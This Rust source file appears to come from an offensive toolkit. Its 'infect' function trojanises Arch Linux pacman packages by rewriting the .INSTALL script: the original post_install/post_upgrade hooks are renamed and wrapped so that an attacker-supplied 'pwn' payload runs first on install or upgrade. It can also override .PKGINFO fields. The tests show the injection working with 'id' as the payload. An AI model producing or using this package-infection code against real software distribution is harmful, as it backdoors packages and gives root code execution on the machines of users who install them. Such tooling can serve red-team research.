use crate::args;
use crate::compression;
use crate::errors::*;
use blake2::{Blake2b512, Digest};
use indexmap::IndexMap;
use std::collections::HashMap;
use std::fmt::Write;
use std::io::prelude::*;
use std::rc::Rc;
use std::str::FromStr;
use tar::Archive;
use yash_syntax::syntax;

#[derive(Debug, PartialEq, Eq, Default)]
pub struct PkgInfo {
    comments: Vec<String>,
    map: IndexMap<String, Vec<String>>,
}

impl PkgInfo {
    pub fn add_values(&mut self, key: &str, values: &[&str]) {
        let values = values.iter().map(|x| String::from(*x)).collect();
        self.map.insert(key.to_string(), values);
    }
}

impl FromStr for PkgInfo {
    type Err = Error;

    fn from_str(s: &str) -> Result<PkgInfo> {
        let mut x = PkgInfo::default();
        for line in s.split('\n') {
            if line.starts_with('#') {
                x.comments.push(line.to_string());
            } else if let Some((key, value)) = line.split_once(" = ") {
                x.map
                    .entry(key.to_string())
                    .or_default()
                    .push(value.to_string());
            }
        }
        Ok(x)
    }
}

impl ToString for PkgInfo {
    fn to_string(&self) -> String {
        let mut out = String::new();
        for comment in &self.comments {
            writeln!(out, "{}", comment).ok();
        }
        for (key, values) in &self.map {
            for value in values {
                writeln!(out, "{} = {}", key, value).ok();
            }
        }
        out
    }
}

fn hash_script(script: &str) -> String {
    let mut hasher = Blake2b512::new();
    hasher.update(script.as_bytes());
    let res = hasher.finalize();
    hex::encode(&res[..6])
}

fn fn_name(name: &str) -> Result<syntax::Word> {
    name.parse::<syntax::Word>()
        .map_err(|err| anyhow!("Failed to create function name: {:#?}", err))
}

pub fn patch_install_script(script: Option<&str>, payload: &str) -> Result<String> {
    if let Some(script) = &script {
        let hash = hash_script(script);
        let mut parsed: syntax::List = script
            .parse()
            .map_err(|err| anyhow!("Failed to parse input as shell script: {:#?}", err))?;

        for item in &mut parsed.0 {
            if let Some(and_or) = Rc::get_mut(&mut item.and_or) {
                for cmd in &mut and_or.first.commands {
                    if let Some(syntax::Command::Function(fun)) = Rc::get_mut(cmd) {
                        let name = fun.name.to_string();
                        let word = fn_name(&format!("{}_{}", name, hash))?;
                        debug!("Found function {:?}: {:?}", name, fun.body.to_string());
                        fun.name = word;
                    }
                }
            }
        }

        let mut out = String::new();
        writeln!(
            out,
            "pwn_{hash}() {{ test -n \"$pwned_{hash}\" && return; pwned_{hash}=1; {}; }}",
            payload,
            hash = hash
        )?;
        writeln!(
            out,
            "post_install() {{ pwn_{hash}; post_install_{hash} \"$1\"; }}",
            hash = hash
        )?;
        writeln!(
            out,
            "post_upgrade() {{ pwn_{hash}; post_upgrade_{hash} \"$1\"; }}",
            hash = hash
        )?;
        write!(out, "{}", parsed)?;
        Ok(out)
    } else {
        let mut out = String::new();
        writeln!(out, "pwn() {{ {}; }}", payload)?;
        writeln!(out, "post_install() {{ pwn; }}")?;
        writeln!(out, "post_upgrade() {{ pwn; }}")?;
        Ok(out)
    }
}

pub fn infect(args: &args::InfectPacmanPkg, pkg: &[u8]) -> Result<Vec<u8>> {
    let mut pkginfo_overrides = HashMap::<_, Vec<_>>::new();
    for set in &args.set {
        let (a, b) = set
            .split_once('=')
            .with_context(|| anyhow!("Invalid --set assignment: {:?}", set))?;
        pkginfo_overrides
            .entry(a.to_string())
            .or_default()
            .push(b.to_string());
    }
    debug!("Parsed pkginfo overrides: {:?}", pkginfo_overrides);

    let comp = compression::detect_compression(pkg);

    let tar = compression::stream_decompress(comp, pkg)?;
    let mut archive = Archive::new(tar);

    let mut out = Vec::new();
    {
        let mut builder = tar::Builder::new(&mut out);

        debug!("Walking through original archive...");
        for entry in archive.entries()? {
            let mut entry = entry?;
            let mut header = entry.header().clone();
            debug!("Found entry in tar: {:?}", header.path());
            match header.path()?.to_str() {
                Some(".INSTALL") => {
                    debug!("Package already has install script, patching...");
                    let mut script = String::new();
                    entry.read_to_string(&mut script)?;
                    debug!("Found existing install script: {:?}", script);
                    let script = patch_install_script(Some(&script), &args.payload)
                        .context("Failed to patch install script")?;
                    debug!("Patched install script: {:?}", script);

                    header.set_size(script.len() as u64);
                    header.set_cksum();

                    builder.append(&header, &mut script.as_bytes())?;
                }
                Some(".PKGINFO") => {
                    if pkginfo_overrides.is_empty() {
                        debug!("Passing through pkginfo unparsed");
                        builder.append(&header, &mut entry)?;
                    } else {
                        let mut pkginfo = String::new();
                        entry.read_to_string(&mut pkginfo)?;
                        let mut pkginfo = pkginfo
                            .parse::<PkgInfo>()
                            .context("Failed to parse pkginfo")?;
                        debug!("Found pkginfo: {:?}", pkginfo);

                        for (key, value) in &pkginfo_overrides {
                            let old = pkginfo.map.insert(key.clone(), value.clone());
                            debug!("Updated pkginfo {:?}: {:?} -> {:?}", key, old, value);
                        }

                        let buf = pkginfo.to_string();
                        debug!("Generated new pkginfo: {:?}", buf);
                        header.set_size(buf.len() as u64);
                        header.set_cksum();

                        builder.append(&header, &mut buf.as_bytes())?;
                    }
                }
                _ => {
                    builder.append(&header, &mut entry)?;
                }
            }
        }

        builder.finish()?;
    }
    // TODO: this copies multiple times
    let out = compression::compress(comp, &out)?;
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_gen_install_script() -> Result<()> {
        let script = patch_install_script(None, "id")?;
        assert_eq!(
            script,
            "\
pwn() { id; }
post_install() { pwn; }
post_upgrade() { pwn; }
"
        );
        Ok(())
    }

    #[test]
    fn test_modify_install_script() -> Result<()> {
        let data = r#"post_install() {
      setcap cap_sys_chroot=ep usr/bin/sn0int 2> /dev/null
}

post_upgrade() {
      post_install "$1"
}

# vim:set ts=2 sw=2 et:
"#;
        let script = patch_install_script(Some(data), "id")?;
        assert_eq!(script, "\
pwn_cc6b4ff7816d() { test -n \"$pwned_cc6b4ff7816d\" && return; pwned_cc6b4ff7816d=1; id; }
post_install() { pwn_cc6b4ff7816d; post_install_cc6b4ff7816d \"$1\"; }
post_upgrade() { pwn_cc6b4ff7816d; post_upgrade_cc6b4ff7816d \"$1\"; }
post_install_cc6b4ff7816d() { setcap cap_sys_chroot=ep usr/bin/sn0int 2>/dev/null; }; post_upgrade_cc6b4ff7816d() { post_install \"$1\"; }");
        Ok(())
    }

    #[test]
    fn test_parse_pkginfo() -> Result<()> {
        let data = "# Generated by makepkg 6.0.1\n# using fakeroot version 1.28\npkgname = sn0int\npkgbase = sn0int\npkgver = 0.24.2-1\npkgdesc = Semi-automatic OSINT framework and package manager\nurl = https://github.com/kpcyrd/sn0int\nbuilddate = 1648545922\npackager = kpcyrd <kpcyrd@archlinux.org>\nsize = 17775566\narch = x86_64\nlicense = GPL3\ndepend = libcap\ndepend = lua52\ndepend = sqlite\ndepend = libseccomp.so=2-64\ndepend = libsodium\ndepend = geoip2-database\ndepend = publicsuffix-list\nmakedepend = cargo\nmakedepend = python-sphinx\n";
        let pkginfo = data.parse::<PkgInfo>()?;
        let mut expected = PkgInfo {
            comments: vec![
                "# Generated by makepkg 6.0.1".to_string(),
                "# using fakeroot version 1.28".to_string(),
            ],
            ..Default::default()
        };
        expected.add_values("pkgname", &["sn0int"]);
        expected.add_values("pkgbase", &["sn0int"]);
        expected.add_values("pkgver", &["0.24.2-1"]);
        expected.add_values(
            "pkgdesc",
            &["Semi-automatic OSINT framework and package manager"],
        );
        expected.add_values("url", &["https://github.com/kpcyrd/sn0int"]);
        expected.add_values("builddate", &["1648545922"]);
        expected.add_values("packager", &["kpcyrd <kpcyrd@archlinux.org>"]);
        expected.add_values("size", &["17775566"]);
        expected.add_values("arch", &["x86_64"]);
        expected.add_values("license", &["GPL3"]);
        expected.add_values(
            "depend",
            &[
                "libcap",
                "lua52",
                "sqlite",
                "libseccomp.so=2-64",
                "libsodium",
                "geoip2-database",
                "publicsuffix-list",
            ],
        );
        expected.add_values("makedepend", &["cargo", "python-sphinx"]);
        assert_eq!(pkginfo, expected);
        Ok(())
    }
}
